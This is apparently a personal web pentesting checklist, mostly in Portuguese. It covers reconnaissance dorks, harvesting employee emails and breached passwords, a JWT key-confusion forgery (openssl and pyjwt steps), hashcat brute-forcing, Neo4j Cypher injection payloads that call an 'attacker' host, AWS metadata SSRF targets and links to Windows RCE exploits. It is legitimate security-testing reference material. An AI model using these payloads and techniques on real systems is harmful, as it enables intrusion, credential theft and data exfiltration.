## task list
- procurar subdominios
    - recon-ng + seclists, subfinder
- navegar por toda a aplicacao como um usuario comum
    - salvando urls interessantes e ataques imaginados
    - guardar pontos para enviar blind xss        
- identificar tecnologia utilizada pela aplicacao
    - tentar forcar mensagens de erro
    - analisar headers e nomes de arquivos
    - 
- procurar sobre a aplicação
    - em buscadores
        - site:site.com.br intitle:index.of|phpinfo
        - site:site.com.br inurl:login|phpinfo|htaccess|git|readme|license|install|setup|config
        - site:site.com.br ext:sql | ext:db | ext:dbf | ext:mdb | ext:log | ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup
        - site:site.com.br ext:xml | ext:json | ext:csv | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini
        - site:site.com.br intext:"sql syntax near" | intext:"syntax error" | intext:"incorrect syntax" | intext:"unexpected end" | intext:"mysql_connect" | intext:"mysql_query" | intext:"pg_connect"
        - site:pastebin.com site.com.br
        - "site.com.br"
        (dorks.faisalahmed.me)
    - github
        - https://github.com/search?q=site.com.br&type=code
        - site:github.com site.com.br
    - web.archive.org
        - navegar por versoes anteriores
        - curl 'https://web.archive.org/cdx/search?url=site.com.br&matchType=domain&fl=original&collapse=original&output=text&limit=100000' | sort -u
- scan automatizado
    - nikto, ?wapiti, wpscan, burp
    - ?nuclei
    - ?oneforall
    - ?rengine
    - procurar cves afetando a aplicacao 
      - busca manual por versao encontrada
      - nessus
      - nmap scripts
      - shodan, censys
      - CVE to MS bulletin https://docs.microsoft.com/en-us/search/?terms=CVE-2XXX-XXX
      - procurar exploits (exploitdb, github, securityfocus, google)
- se a app eh bruteforcable, reunir e-mails
    - procurar em buscadores "@empresa"
    - procurar emails dos funcionarios (aplicacao, linkedin)
        - site:linkedin.com employees site.com.br
    - theHarvester
    - identificar senhas em breach databases
- criar wordlist
    - seclists
    - bopscrk
- fuzzing na aplicacao
    - buscar paths no sitemap do burp
    - fuzzing com token de sessao
    - lanjelot/patator, wfuzz
- manual tests
    - submit blind xss payloads
    - XSStrike

## reset senha
- adicionar parametro de email/telefone
- pedir reset de senha alterando header Host
- tentar alterar a senha sem a atual

## code review
- insider
- spotbugs
- graudit

## http techniques
- /param[]
- /add?_method=DELETE
- X-HTTP-Method-Override: DELETE

## jwt
- jws (assinatura) e jwe (encriptação) são tipos de jwt
- signature exclusion / remover assinatura
    - "alg": "none"
    - remover signature
- key confusion / trocar algoritmo de assinatura
    - trocar cifra RS256 (RSA, que é assimetrico) para HS256 (HMAC, que é simetrico) e usar chave publica para assinar
    - 1) <pre> openssl s_client -showcerts -connect target.com:443 certs.pem && csplit -z -f 'cert' -b '%02d.pub' certs.pem '/BEGIN/' '{*}' && rm certs.pem && find . -maxdepth 1 -name "*.pub" -exec sh -c "openssl x509 -in {} -pubkey > {}.pem" \; && rm *.pub</pre>
    - 2) ```JOSEPH``` or ```pip install pyjwt==0.4.3```
    - 3) import jwt; print(jwt.encode({"data":"test"}, key=open("public.pem", "r").read(), algorithm="HS256"))
- brute
    - hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a

## neo4j cypher injection
```
 LOAD CSV FROM 'https://attacker' as yl
 LOAD CSV FROM 'https://attacker' as yl//
})LOAD CSV FROM 'https://attacker' as yl
})LOAD CSV FROM 'https://attacker' as yl//
' LOAD CSV FROM 'https://attacker' as yl MATCH(:Z) WHERE '3'='3
' LOAD CSV FROM 'https://attacker' as yl//
'})LOAD CSV FROM 'https://attacker' as yl MATCH(:Z{w:'3
'})LOAD CSV FROM 'https://attacker' as yl//
" LOAD CSV FROM 'https://attacker' as yl MATCH(:Z) WHERE "3"="3
" LOAD CSV FROM 'https://attacker' as yl//
"})LOAD CSV FROM 'https://attacker' as yl MATCH(:Z{w:"3
"})LOAD CSV FROM 'https://attacker' as yl//
```

## keycloak
- REALM_NAME='master' -> testar também realm_name da app
- /auth/realms/{REALM_NAME} -> retorna a possível chave pública que tu vai usar pro ataque de downgrade
- /auth/realms/{REALM_NAME}/account -> interface admin do realm do keycloak
- /auth/realms/{REALM_Name}/.well-known/openid-configuration
- /auth/realms/{REALM_Name}/protocol/openid-connect/certs
- /auth/realms/{REALM_Name}/protocol/openid-connect/logout?redirect_uri=www.tempest.com.br


## java (?apenas tomcat e jetty?)
- subverter lista de controle de acesso (ACL bypass)
    * /foo../restrict
    * /foo;/restrict
        - alguns proxys vao parar de ler e liberar para a app 
    * cenario exemplo: nginx como proxy reverso de app em tomcat
- https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf

## spring
- /actuator
    * ?visualvm

## asp.net
```
TODO
https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter
https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services
https://www.youtube.com/watch?v=HrJW6Y9kHC4
https://blog.liquidsec.net/2021/06/01/asp-net-cryptography-for-pentesters/
https://paulmuellersec.files.wordpress.com/2021/06/asp.netcryptocheatsheet.pdf
http://phototor.com/2019/02/04/microsoft-iis-rce-vulnerability-cve-2017-7269/
```
## ssrf
- se for aws
    - http://169.254.169.254/latest/meta-data
    - http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
    - http://169.254.169.254/latest/meta-data/iam/security-credentials/
- RhinoSecurityLabs/pacu
## aws
    - export AWS_ACCESS_KEY_ID=
    - export AWS_SECRET_ACCESS_KEY=
    - export AWS_SESSION_TOKEN=
    - aws iam get-user
    - aws s3 sync s3://bucket bucketfiles --no-sign-request

## mobile
- mobsf static analysis
- Buscar por chaves no app, regex:
    * secret|key|password|aws
    * [a-zA-Z]{3,15}:\/\/[^\/\\:@]+:[^\/\\:@]+@.{1,100}

## flutter
- https://blog.nviso.eu/2019/08/13/intercepting-traffic-from-android-flutter-applications/
- https://raphaeldenipotti.medium.com/bypassing-ssl-pinning-on-android-flutter-apps-with-ghidra-77b6e86b9476

## firebase
- acessar *.firebaseio.com/.json
    https://pentestguy.in/pentesting-insecure-firebase-bugbounty-penetration-testing/
- fuzzing de nomes de tabelas, ex: *.firebaseio.com/Users.json 

## frida
- https://www.romainthomas.fr/post/20-09-r2con-obfuscated-whitebox-part1/

## f5 big-ip tmui
https://github.com/yassineaboukir/CVE-2020-5902

## windows rce

- CVE-2008-4250 / MS08-067 - xp, 2003, 2008 - rpc - 445
- CVE-2017-014[3-8] / MS17-010 - 7, 8, 2008, 2012 - smb - 445 - EternalBlue
- CVE-2019-0708 - 7, 2003, 2008 - rdp - 3389 - bluekeep
- CVE-2021-1675 - 7, 8, 10, 2008, 2012, 2016, 2019 - printer spooler - 445 - printnightmare
    * https://github.com/afwu/PrintNightmare
    * https://github.com/cube0x0/CVE-2021-1675



## sources
- https://application.security/free/owasp-top-10
